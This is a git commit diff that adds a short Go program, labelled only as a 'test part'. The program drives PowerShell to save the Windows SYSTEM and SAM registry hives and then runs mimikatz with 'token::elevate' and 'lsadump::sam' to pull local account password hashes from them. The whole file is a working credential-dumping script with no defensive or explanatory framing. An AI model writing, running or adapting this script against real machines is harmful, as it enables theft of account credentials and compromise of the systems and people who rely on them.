e53676b948c93e1e9a899ec1238c12eb69a6713a
Yerassyl <tleugazy98@gmail.com>
2021-06-21 08:32:24 +0600

    feat:add test part

---
+++ 1.go
@@ -0,0 +1,36 @@
+package main
+
+import (
+	"fmt"
+	ps "github.com/bhendo/go-powershell"
+	"os"
+	"github.com/bhendo/go-powershell/backend"
+)
+
+func main(){
+	back := &backend.Local{}
+	shell, err := ps.New(back)
+	if err != nil {
+		panic(err)
+	}
+	defer shell.Exit()
+	err = os.Chdir("mimi/x64")
+	if err != nil {
+		panic(err)
+		return
+	}
+	stdout, _, err := shell.Execute("reg save HKLM\\SYSTEM mimi/x64/system2.hiv")
+	if err != nil {
+		panic(err.Error())
+	}
+	stdout, _, err = shell.Execute("reg save HKLM\\SAM mimi/x64/sam2.hiv")
+	if err != nil {
+		panic(err.Error())
+	}
+	fmt.Println(stdout)
+	stdout, _, err = shell.Execute("cd mimi\\x64 ; .\\mimikatz 'token::elevate' lsadump::sam system2.hiv sam2.hiv exit")
+	if err != nil {
+		panic(err.Error())
+	}
+	fmt.Println(stdout)
+}
